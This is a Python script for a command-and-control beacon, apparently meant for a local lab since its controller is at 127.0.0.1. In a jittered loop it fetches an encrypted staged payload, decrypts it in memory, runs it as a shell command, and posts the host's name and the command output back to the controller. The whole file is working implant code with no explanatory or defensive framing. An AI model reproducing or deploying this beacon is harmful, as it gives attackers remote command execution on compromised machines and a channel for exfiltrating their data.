import time
import random
import urllib.request
import base64
import json
import subprocess
import socket
from cryptography.fernet import Fernet

CONTROLLER_URL = "http://127.0.0.1:8080/fetch-stage"
TELEMETRY_URL = "http://127.0.0.1:8080/telemetry"

def fetch_and_execute():
    print("[*] Contacting C2 controller for staged payload...")
    try:
        req = urllib.request.Request(CONTROLLER_URL)
        with urllib.request.urlopen(req) as response:
            encrypted_payload = response.read()
            encoded_key = response.headers.get("X-Session-Key")
            
        if not encoded_key:
            print("[-] Failed to retrieve decryption key.")
            return

        cipher = Fernet(base64.b64decode(encoded_key))
        decrypted_command = cipher.decrypt(encrypted_payload).decode()
        print("[+] Payload decrypted successfully in memory.")

        result = subprocess.run(decrypted_command, shell=True, capture_output=True, text=True)
        output = result.stdout if result.returncode == 0 else result.stderr

        telemetry_data = {
            "hostname": socket.gethostname(),
            "status": "success",
            "output": output.strip()
        }
        
        req = urllib.request.Request(
            TELEMETRY_URL, 
            data=json.dumps(telemetry_data).encode('utf-8'),
            headers={'Content-Type': 'application/json'}
        )
        urllib.request.urlopen(req)
        print("[+] Telemetry transmitted back to controller.")

    except Exception as e:
        print(f"[-] Error during execution loop: {e}")

def main():
    base_interval = 10
    jitter_range = 5
    
    while True:
        fetch_and_execute()
        sleep_time = base_interval + random.uniform(-jitter_range, jitter_range)
        print(f"[*] Sleeping for {sleep_time:.2f} seconds (Jitter applied)...\n")
        time.sleep(sleep_time)

if __name__ == "__main__":
    main()